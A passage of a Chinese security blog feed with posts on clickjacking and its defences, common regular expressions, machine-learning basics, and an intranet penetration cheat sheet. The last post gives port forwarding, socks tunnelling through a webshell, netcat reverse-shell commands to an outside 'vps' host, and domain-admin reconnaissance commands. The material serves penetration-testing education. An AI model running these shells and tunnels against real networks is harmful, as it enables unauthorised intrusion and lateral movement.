如使用css调整图片大小位置，通过设置opacity参数调整元素透明度等；目的都是让用户就无法看到含恶意代码的目标网页。 </p><p>这是点击劫持的原理，关键在于构造不可见的透明iframe来进行利用； </p><h2 id="0x02-挖掘的思路"><a href="#0x02-挖掘的思路" class="headerlink" title="0x02 挖掘的思路"></a>0x02 挖掘的思路</h2><p>1.我们只需要创建一个iframe的页面嵌套就可以简单的测试 </p><p>如果目标应用支持iframe进行页面嵌套，那么基本断定网站存在点击劫持攻击漏洞 比如<code>&lt;iframe src=&quot;http://target.com&quot;/&gt;</code> ，假设该页面上显示hello world 如果通过iframe嵌套后能显示为 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112339_70.png" alt=""></p><p>基本就能确定存在点击劫持风险 </p><p>2.通过目标的HTTP响应头是否设置好了X-Frame-Options字段，是否有JavaScript的Frame Busting机制，也可以进行判断 ，比如在用常见的WVS进行网站扫描时，会经常看到这样的信息： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112340_436.jpg" alt=""></p><p>这就是通过判断是否存在X-Frame-Options响应头来处理 其他辅助工具进行clickjacking漏洞探测的时候，也都基本上基于以上情况进行处理 </p><h2 id="0x03-举列子"><a href="#0x03-举列子" class="headerlink" title="0x03 举列子"></a>0x03 举列子</h2><p>这两处代码截图是github上的clickjacking扫描的代码，可以参考：<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/D4Vinci/Clickjacking-Tester</a> <a href="qq://txfile/#" target="_blank" rel="external">https://github.com/LTF1633242320/D-TECT</a> </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112341_651.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112341_810.png" alt=""></p><p>点击劫持 主要是靠点击，也有通过拖拽进行劫持实现的 </p><p>这种点击劫持的案例，比较知名的包括：Facebook 的‘likejacking’攻击、Adobe Flash Player 网站漏洞、Twitter 的 Don’t click 攻击、谷歌账户点击劫持攻击等 </p><p>在诸多点击劫持案例中，最为经典的案例是攻击者通过flash构造出点击劫持，最终控制用户电脑摄像头事件; </p><p>首先，攻击者构造一个flash小游戏，并贴心逼真地显示了游戏得分以及游戏耗时，诱导用户试玩；在试玩过程中引导用户点击不停变换位置的“click”按钮， 而其实在游戏界面中隐藏了一个看不见的iframe </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112354_232.png" alt=""></p><p>攻击通过诱导用户使用鼠标点击看似随意的位置，来完成较为复杂的操作。 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112355_209.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_575.png" alt=""></p><p>并最终开启了用户的摄像头 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_551.png" alt=""></p><p>某浪博客关注点击劫持 </p><p>在新浪博客的“加关注”处： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112356_303.jpg" alt=""></p><p>通过简单构造的html页面，如下， </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_673.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_64.png" alt=""></p><p>通过构造iframe 从而进行博客关注数量的刷新 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112357_869.jpg" alt=""></p><p>当然可以再对html页面进行精心美化调整，从而大面积进行点击劫持攻击的实施。 分享一个github上的类似开启摄像头的一个demo，可以在做安全意识培训是当演示了<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/thomaspatzke/Clickjacking-Exploit</a></p><p>低版本IE时代的东西了吧 用浏览器插件 </p><p>html5可以直接调用摄像头  前段时间有朋友搞得一个xss用HTML5调用摄像头，直接可以看到使用者照片 </p><h2 id="0x04-点击劫持与其他漏洞结合效果"><a href="#0x04-点击劫持与其他漏洞结合效果" class="headerlink" title="0x04 点击劫持与其他漏洞结合效果"></a>0x04 点击劫持与其他漏洞结合效果</h2><p>可以配合CSRF  </p><p>反射型xss可以和点击劫持一起形成差不多储存型xss的效果</p><p>反射XSS直接利用需要对方点击，如果直接把包含反射XSS的链接发送给受害者，比较唐突难以利用，所以如果将点击劫持与反射xss结合起来，利用iframe嵌套诱导，也就基本能达到存储XSS的效果 </p><h2 id="0x05-点击劫持漏洞的防御方法"><a href="#0x05-点击劫持漏洞的防御方法" class="headerlink" title="0x05 点击劫持漏洞的防御方法"></a>0x05 点击劫持漏洞的防御方法</h2><p>点击劫持漏洞的防御 主要是两种，一个是通过Frame busting防御、一种是通过添加X-Frame-Options属性进行防御 </p><p>frame busting防御，通过js代码禁止iframe的嵌套，如判断顶层窗口跳转： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112359_756.png" alt=""></p><p>下面是一些常见Frame busting： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808112359_295.png" alt=""></p><p>但frame busting存在被绕过的可能，如多层iframe嵌套等； 在HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的脚本执行，从而可以使得frame busting失效 ,比如在html5中进行绕过：设置<iframe>属性：sandbox </iframe></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120000_760.png" alt=""></p><p>当sandbox 仅设置为allow-forms时，js是不被执行的 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120000_246.png" alt=""></p><p>设置<iframe>属性：security；当security设置为restricted后，frame中的脚本也将不能执行；但仅限于IE ，如此一来，由于无法执行js脚本，则通过JS来判断顶层跳转将失败 </iframe></p><p>第二种方式，设置X-Frame-Options属性； X-Frame-Options是一个微软提出的一个HTTP响应头；用来给浏览器指示允许一个页面可否在 <frame>, <iframe> 或者 <object> 中展现的标记。 </object></iframe></p><p>通过设置X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持；这是目前处理点击劫持攻击的最优且最可靠的手段； X-Frame-Options 的三个可选值：  Ø    DENY  Ø    SAMEORIGIN  Ø    ALLOW-FROM origin </p><p>以下是这三个可选值的表义： 如果设置为 DENY，表示该页面不允许在 frame 中展示，即便是在同源域名的页面中嵌套也不允许； </p><p>如果设置为 SAMEORIGIN，表示该页面可以在同源域名页面的 frame 中嵌套展示； 如果设置为 ALLOW-FROM，表示该页面可以在指定来源的 frame 中嵌套展示（origin为允许frame加载的页面地址）； </p><p>在各个平台中间件中X-Frame-Options的配置不一样， 在IIS环境中，在web站点的web.config中配置。 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_277.png" alt=""></p><p>在apache中： 先开启mod_<a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>，即在httpd.conf中去掉“LoadModule headers<em>module modules/mod</em><a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>”前的#； 再.修改httpd.conf，添加下面内容：Header always append X-Frame-Options DENY 修改完如下: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_486.png" alt=""></p><p>如果同一台apache服务器上有多个站点，只想针对其中一个站点进行配置，可以修改.htaccess文件，添加如下内容： Header append X-FRAME-OPTIONS “DENY” </p><p>如果是nginx，则修改nginx.conf,在server下添加下面内容： add_header X-Frame-Options “DENY”; 添加完成如下： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120001_76.png" alt=""></p><p>以上主要是针对服务端的防御，如果是客户端的话，那就是保持浏览器的及时升级更新， 最新版浏览器通常具备更好更多的安全机制保护客户的信息安全，及时升级更新浏览器，可从一定程度上进行漏洞攻击的有效防范 </p><p>另一方面，作为客户端，可以通过安装浏览器的扩展插件，达到对潜在威胁进行阻止及警告，及时判断页面中的不安全因素； 如果你使用的是Firefox，则可以安装插件NoScript，在选项中设置禁止<iframe>，效果如下： </iframe></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808120002_346.png" alt=""></p><p>有了X-Frame-Options的http头差不多就是不能进行点击劫持了吧 </p><p>这里顺便分享几个关于点击劫持的PoC工具，师傅们可以玩玩： </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/enddo/CJExploiter</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/sensepost/jack</a> </p><p><a href="qq://txfile/#" target="_blank" rel="external">https://github.com/samyk/quickjack</a>     </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web漏洞挖掘之点击劫持漏洞&quot;&gt;&lt;a href=&quot;#web漏洞挖掘之点击劫持漏洞&quot; class=&quot;headerlink&quot; title=&quot;web漏洞挖掘之点击劫持漏洞&quot;&gt;&lt;/a&gt;web漏洞挖掘之点击劫持漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x00-点击劫持的概念&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="WebSecurity" scheme="http://mang0.me/categories/WebSecurity/"/>
    
    
      <category term="Web漏洞" scheme="http://mang0.me/tags/Web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>20个常用的正则表达式</title>
    <link href="http://mang0.me/archives/7fe4b50e/"/>
    <id>http://mang0.me/archives/7fe4b50e/</id>
    <published>2018-10-09T08:29:34.000Z</published>
    <updated>2018-10-15T00:40:51.525Z</updated>
    
    <content type="html"><![CDATA[<h1 id="20个常用的正则表达式"><a href="#20个常用的正则表达式" class="headerlink" title="20个常用的正则表达式"></a>20个常用的正则表达式</h1><h2 id="1-校验密码强度"><a href="#1-校验密码强度" class="headerlink" title="1 . 校验密码强度**"></a>1 . 校验密码强度**</h2><p>密码的强度必须是包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间。</p><pre><code>^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></pre><h2 id="2-校验中文"><a href="#2-校验中文" class="headerlink" title="2. 校验中文"></a><strong>2. 校验中文</strong></h2><p>字符串仅能是中文。</p><pre><code>^[\\u4e00-\\u9fa5]{0,}$</code></pre><h2 id="3-由数字、26个英文字母或下划线组成的字符串"><a href="#3-由数字、26个英文字母或下划线组成的字符串" class="headerlink" title="3. 由数字、26个英文字母或下划线组成的字符串"></a><strong>3. 由数字、26个英文字母或下划线组成的字符串</strong></h2><pre><code>^\\w+$</code></pre><h2 id="4-校验E-Mail-地址"><a href="#4-校验E-Mail-地址" class="headerlink" title="4. 校验E-Mail 地址"></a><strong>4. 校验E-Mail 地址</strong></h2><p>同密码一样，下面是E-mail地址合规性的正则检查语句。</p><pre><code>[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+(?:\\.[\\w!#$%&amp;&#39;*+/=?^_`{|}~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?</code></pre><h2 id="5-校验身份证号码"><a href="#5-校验身份证号码" class="headerlink" title="5. 校验身份证号码"></a><strong>5. 校验身份证号码</strong></h2><p>下面是身份证号码的正则校验。15 或 18位。</p><p>15位：</p><pre><code>^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$</code></pre><p>18位：</p><pre><code>^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$</code></pre><h2 id="6-校验日期"><a href="#6-校验日期" class="headerlink" title="6. 校验日期"></a><strong>6. 校验日期</strong></h2><p>“yyyy-mm-dd“ 格式的日期校验，已考虑平闰年。</p><pre><code>^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$</code></pre><h2 id="7-校验金额"><a href="#7-校验金额" class="headerlink" title="7. 校验金额"></a><strong>7. 校验金额</strong></h2><p>金额校验，精确到2位小数。</p><pre><code>^[0-9]+(.[0-9]{2})?$</code></pre><h2 id="8-校验手机号"><a href="#8-校验手机号" class="headerlink" title="8. 校验手机号"></a><strong>8. 校验手机号</strong></h2><p>下面是国内 13、15、18开头的手机号正则表达式。（可根据目前国内收集号扩展前两位开头号码）</p><pre><code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$</code></pre><h2 id="9-判断IE的版本"><a href="#9-判断IE的版本" class="headerlink" title="9. 判断IE的版本"></a><strong>9. 判断IE的版本</strong></h2><p>IE目前还没被完全取代，很多页面还是需要做版本兼容，下面是IE版本检查的表达式。</p><pre><code>^.*MSIE [5-8](?:\\.[0-9]+)?(?!.*Trident\\/[5-9]\\.0).*$</code></pre><h2 id="10-校验IP-v4地址"><a href="#10-校验IP-v4地址" class="headerlink" title="10. 校验IP-v4地址"></a><strong>10. 校验IP-v4地址</strong></h2><p>IP4 正则语句。</p><pre><code>\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b</code></pre><h2 id="11-校验IP-v6地址"><a href="#11-校验IP-v6地址" class="headerlink" title="11. 校验IP-v6地址"></a><strong>11. 校验IP-v6地址</strong></h2><p>IP6 正则语句。</p><pre><code>(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))</code></pre><h2 id="12-检查URL的前缀"><a href="#12-检查URL的前缀" class="headerlink" title="12. 检查URL的前缀"></a><strong>12. 检查URL的前缀</strong></h2><p>应用开发中很多时候需要区分请求是HTTPS还是HTTP，通过下面的表达式可以取出一个url的前缀然后再逻辑判断。</p><pre><code>if (!s.match(/^[a-zA-Z]+:\\/\\//)){    s = &#39;http://&#39; + s;}</code></pre><h2 id="13-提取URL链接"><a href="#13-提取URL链接" class="headerlink" title="13. 提取URL链接"></a><strong>13. 提取URL链接</strong></h2><p>下面的这个表达式可以筛选出一段文本中的URL。</p><pre><code>^(f|ht){1}(tp|tps):\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- ./?%&amp;=]*)?</code></pre><h2 id="14-文件路径及扩展名校验"><a href="#14-文件路径及扩展名校验" class="headerlink" title="14. 文件路径及扩展名校验"></a><strong>14. 文件路径及扩展名校验</strong></h2><p>验证windows下文件路径和扩展名（下面的例子中为.txt文件）</p><pre><code>^([a-zA-Z]\\:|\\\\)\\\\([^\\\\]+\\\\)*[^\\/:*?&quot;&lt;&gt;|]+\\.txt(l)?$</code></pre><h2 id="15-提取Color-Hex-Codes"><a href="#15-提取Color-Hex-Codes" class="headerlink" title="15. 提取Color Hex  Codes"></a><strong>15. 提取Color Hex  Codes</strong></h2><p>有时需要抽取网页中的颜色代码，可以使用下面的表达式。</p><pre><code>^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$</code></pre><h2 id="16-提取网页图片"><a href="#16-提取网页图片" class="headerlink" title="16. 提取网页图片"></a><strong>16. 提取网页图片</strong></h2><p>假若你想提取网页中所有图片信息，可以利用下面的表达式。</p><pre><code>\\&lt; *[img][^\\\\&gt;]*[src] *= *[\\&quot;\\&#39;]{0,1}([^\\&quot;\\&#39;\\ &gt;]*)</code></pre><h2 id="17-提取页面超链接"><a href="#17-提取页面超链接" class="headerlink" title="17. 提取页面超链接"></a><strong>17. 提取页面超链接</strong></h2><p>提取html中的超链接。</p><pre><code>(&lt;a\\s*(?!.*\\brel=)[^&gt;]*)(href=&quot;https?:\\/\\/)((?!(?:(?:www\\.)?&#39;.implode(&#39;|(?:www\\.)?&#39;, $follow_list).&#39;))[^&quot;]+)&quot;((?!.*\\brel=)[^&gt;]*)(?:[^&gt;]*)&gt;</code></pre><h2 id="18-查找CSS属性"><a href="#18-查找CSS属性" class="headerlink" title="18. 查找CSS属性"></a><strong>18. 查找CSS属性</strong></h2><p>通过下面的表达式，可以搜索到相匹配的CSS属性。</p><pre><code>^\\s*[a-zA-Z\\-]+\\s*[:]{1}\\s[a-zA-Z0-9\\s.#]+[;]{1}</code></pre><h2 id="19-抽取注释"><a href="#19-抽取注释" class="headerlink" title="19. 抽取注释"></a><strong>19. 抽取注释</strong></h2><p>如果你需要移除HMTL中的注释，可以使用如下的表达式。</p><pre><code>&lt;!--(.*?)--&gt;</code></pre><h2 id="20-匹配HTML标签"><a href="#20-匹配HTML标签" class="headerlink" title="20. 匹配HTML标签"></a><strong>20. 匹配HTML标签</strong></h2><p>通过下面的表达式可以匹配出HTML中的标签属性。</p><pre><code class="regex">&lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&#39;.*?&#39;|[\\^&#39;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;20个常用的正则表达式&quot;&gt;&lt;a href=&quot;#20个常用的正则表达式&quot; class=&quot;headerlink&quot; title=&quot;20个常用的正则表达式&quot;&gt;&lt;/a&gt;20个常用的正则表达式&lt;/h1&gt;&lt;h2 id=&quot;1-校验密码强度&quot;&gt;&lt;a href=&quot;#1-校验密码强度&quot;
      
    
    </summary>
    
      <category term="Language" scheme="http://mang0.me/categories/Language/"/>
    
    
      <category term="正则" scheme="http://mang0.me/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>机器学习概念</title>
    <link href="http://mang0.me/archives/d4eed376/"/>
    <id>http://mang0.me/archives/d4eed376/</id>
    <published>2018-10-09T08:29:01.000Z</published>
    <updated>2018-10-15T00:40:51.608Z</updated>
    
    <content type="html"><![CDATA[<h1 id="机器学习概念"><a href="#机器学习概念" class="headerlink" title="机器学习概念"></a>机器学习概念</h1><h2 id="什么是机器学习"><a href="#什么是机器学习" class="headerlink" title="什么是机器学习"></a>什么是机器学习</h2><p>我们通常在计算机编程的时候，都是已知输入，然后通过一定的算法产生输出，如下图所示：</p><p><a href="http://blog.laiyum.site/uploads/18052801.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052801.jpg" alt="image"></a></p><p>而还有一种情况呢，我们知道了输入和输出，但是却不知道中间的算法，这时候就需要用机器学习通过观察输入输出来学习这个算法，我们叫做知识，然后用学到的知识通过新的输入来产生输出。简而言之<strong>机器学习是用来寻找输入输出间的映射关系的</strong><br><a href="http://blog.laiyum.site/uploads/18052802.jpg" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052802.jpg" alt="image"></a></p><p>其实我们人在学习思考时，脑子里也有这么个映射过程，当我们看到猫的图片，在脑子里产生了映射，于是乎，就说出了猫这个词，所以呢<strong>机器学习就是让计算机和人一样思考</strong></p><p><a href="http://blog.laiyum.site/uploads/18052803.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052803.png" alt="image"></a></p><h2 id="机器学习相关概念的区别"><a href="#机器学习相关概念的区别" class="headerlink" title="机器学习相关概念的区别"></a>机器学习相关概念的区别</h2><p>在谈到机器学习时，我们经常会听到下面几个概念：数据挖掘，人工智能等等，那他们之间有什么联系呢？我们先来看看下面的这幅图：</p><p><a href="http://blog.laiyum.site/uploads/18052808.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052808.png" alt="image"></a></p><p>也就是说机器学习是数据挖掘它们的底层，机器学习给它们提供算法，数据挖掘则是机器学习的应用。</p><h2 id="机器学习的应用"><a href="#机器学习的应用" class="headerlink" title="机器学习的应用"></a>机器学习的应用</h2><p>像我们熟知的Apple的faceID，google的AlphaGo，MicroSoft的小娜都是机器学习的典型应用</p><h2 id="机器学习方法"><a href="#机器学习方法" class="headerlink" title="机器学习方法"></a>机器学习方法</h2><p>实现机器学习有多种方法，这里方法是我们通常所说的算法，主要有下面几种：</p><h3 id="监督学习方法"><a href="#监督学习方法" class="headerlink" title="监督学习方法"></a>监督学习方法</h3><p>所谓监督学习方法就是说随便给一堆数据和数据对应的标签，计算机在学习之后能根据新的输入数据判断它们对应的标签。</p><p>举个例子，我们给计算机一大堆猫狗的图片，并告诉它，哪些是狗，哪些是猫，计算机学习之后，再给它看猫和狗的图片，它就能告诉我们哪些是狗，哪些是猫。</p><p><a href="http://blog.laiyum.site/uploads/18052804.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052804.png" alt="image"></a></p><p><a href="http://blog.laiyum.site/uploads/18052805.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052805.png" alt="image"></a></p><p>监督学习方法用于分类和回归，我们熟知的神经网络就是一种监督学习方法。</p><h3 id="非监督学习方法"><a href="#非监督学习方法" class="headerlink" title="非监督学习方法"></a>非监督学习方法</h3><p>我们有的时候只给计算机数据，不给计算机对应的标签，计算机能通过观察数据之间的规率进行数据归类<br>还是上面的例子，我们这次不告诉计算机哪些是狗，哪些是猫，计算机学习之后能把他们归类出来。</p><p><a href="http://blog.laiyum.site/uploads/18052806.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052806.png" alt="image"></a></p><p>非监督学习用于聚类，如k-means算法</p><h3 id="半监督学习方法"><a href="#半监督学习方法" class="headerlink" title="半监督学习方法"></a>半监督学习方法</h3><p>半监督学习方法综合了监督学习和非监督学习两种方法。在初始阶段给计算机一些有标签的数据和大量没有标签的数据，计算机学习后能进行归类<br>半监督学习用于训练更高效更准确的模型，因为它既避免了带标签的数据少而的模型过拟合，也减少了打标签的工作量。</p><h3 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h3><p>强化学习是学习一个最优策略，可以让本体在特定环境中，根据当前的状态，做出行动，从而获得最大奖励。</p><p>来个新例子，这次，我们让计算机打篮球，我们并不需要告诉计算机怎么打篮球，我们只需要给它个篮球，让它自己打，然后我们对计算机打分，进球分越高，打分越高，这里的打分就是上面的奖励，每次计算机要做的就是获得最大奖励，一开始，面对陌生的环境，计算机并不知道怎么进球，经过奖励刺激后，命中率就会越来越高。</p><p><a href="http://blog.laiyum.site/uploads/18052807.png" target="_blank" rel="external"><img src="http://blog.laiyum.site/uploads/18052807.png" alt="image"></a></p><p>google的AlphaZero便是强化学习的典型应用</p><h3 id="遗传算法"><a href="#遗传算法" class="headerlink" title="遗传算法"></a>遗传算法</h3><p>模拟自然界优胜劣汰的进化现象，把搜索空间（问题解的组成空间）映射为遗传空间，把可能的解编码成一个向量——染色体，向量的每个元素称为基因。通过不断计算各染色体的适应值，选择最好的染色体，获得最优解。</p><p>还是拿上面的例子来说，先训练出两个打篮球的计算机ai，让这两个aic重组，变异产生后代种群，挑出最会打篮球的再进行重组变异，如此循环，每次挑出最强的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;机器学习概念&quot;&gt;&lt;a href=&quot;#机器学习概念&quot; class=&quot;headerlink&quot; title=&quot;机器学习概念&quot;&gt;&lt;/a&gt;机器学习概念&lt;/h1&gt;&lt;h2 id=&quot;什么是机器学习&quot;&gt;&lt;a href=&quot;#什么是机器学习&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="AiSecurity" scheme="http://mang0.me/categories/AiSecurity/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈内网渗透流程</title>
    <link href="http://mang0.me/archives/17ef10d7/"/>
    <id>http://mang0.me/archives/17ef10d7/</id>
    <published>2018-10-09T02:50:44.000Z</published>
    <updated>2018-11-02T13:52:17.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅谈内网渗透流程"><a href="#浅谈内网渗透流程" class="headerlink" title="浅谈内网渗透流程"></a>浅谈内网渗透流程</h1><h2 id="0x01-内网转发"><a href="#0x01-内网转发" class="headerlink" title="0x01 内网转发"></a>0x01 内网转发</h2><h3 id="lcx-内网端口转发"><a href="#lcx-内网端口转发" class="headerlink" title="lcx 内网端口转发"></a>lcx 内网端口转发</h3><p>Lcx内网端口转发<br>• lcx.exe -slave vps 3333 127.0.0.1 3389 //把主机的3389端口转发到vps的3333端口<br>• lcx.exe –listen 3333 4444 //监听3333端口，并将3333的请求转发给4444端口</p><p>本地端口转发<br>• Lcx.exe –tran 21 主机IP 3389 //将3389端口转发到21端口</p><p>通常时候内网的防火墙把3389端口ban了，无法作为端口转发出去，这个时候应该吧端口转发成21或者80端口，这些端口是有放行策略的，</p><h3 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h3><ul><li>Earthworm </li><li>Termite  //ew升级版 <a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a></li></ul><p>客户端执行：</p><pre><code>agent_windows_x86.exe -l  4444</code></pre><p>管理端执行：</p><pre><code>admin_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>将新的agent加入拓扑：</p><pre><code>agent_windows_x86.exe -c 127.0.0.1 -p 4444</code></pre><p>具体使用方法可参考： <a href="http://rootkiter.com/Termite/README.txt" target="_blank" rel="external">http://rootkiter.com/Termite/README.txt</a></p><ul><li><p>S5.py  //配合Proxifier一起使用</p></li><li><p>reGeorg //通过webshell 建立一个 socks 代理进行内网穿透</p><p>  s</p></li></ul><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><p>反向连接<br>• nc -lvp 4444 //vps上执行<br>• nc -t -e cmd.exe vps 4444 //-t 参数是指通过telnet模式执行cmd.exe<br> 正向代理<br>• nc -l -p 4444 -t -e cmd.exe //vps上<br>• nc -vv vps 4444 //本地执行</p><h3 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p><p>工具地址： <a href="https://github.com/fatedier/frp" target="_blank" rel="external">https://github.com/fatedier/frp</a></p><p><strong>frp 的作用</strong></p><p>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p><p>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p><p>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p><p>启动frp服务器端：</p><pre><code>frps.exe -c frps.ini</code></pre><p>浏览器访问： 127.0.0.1：7500，输入frps.ini中配置的用户名和密码即可进入控制面板： </p><h3 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h3><p>这里仅简单演示下Windows平台上的使用：</p><p>首先在内网主机上执行（内网主机需安装Python）：</p><pre><code>python -m SimpleHTTPServer 8089</code></pre><p>我这里在Windows下用Python 2.7来演示，就执行：</p><pre><code>py -2 -m SimpleHTTPServer 8089</code></pre><p><a href="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/cghz3gapb/360_20180502231649460.jpg" alt="内网渗透之端口转发与代理"></a></p><p>将ngrok上传至内网主机并启动ngrok：</p><pre><code>ngrok.exe http 8089</code></pre><p><a href="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" target="_blank" rel="external"><img src="https://s9.postimg.cc/7j4ei1ixb/360_20180502232222200.jpg" alt="内网渗透之端口转发与代理"></a></p><p>这时我们只需要在浏览器中访问：</p><pre><code>http://cdb0e21b.ngrok.io或者https://cdb0e21b.ngrok.io</code></pre><p>即可通过HTTP或者HTTPS来访问内网主机上的文件。</p><p>当然ngrok还有很多其他功能，更多使用方法请参考官方文档： <a href="https://ngrok.com/docs" target="_blank" rel="external">https://ngrok.com/docs</a></p><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h2><h3 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h3><p>query user || qwinsta 查看当前在线用户</p><p>net user  查看本机用户</p><p>net user /domain 查看域用户</p><p>net view &amp; net group “domain computers” /domain 查看当前域计算机列表 第二个查的更多</p><p>net view /domain 查看有几个域</p><p>net view \\dc   查看 dc 域内共享文件</p><p>net group /domain 查看域里面的组</p><p>net group “domain admins” /domain 查看域管</p><p>net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管</p><p>net group “domain controllers” /domain 域控</p><p>net time /domain </p><p>net config workstation   当前登录域 - 计算机名 - 用户名</p><p>net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源</p><p>ipconfig</p><p>systeminfo</p><p>tasklist 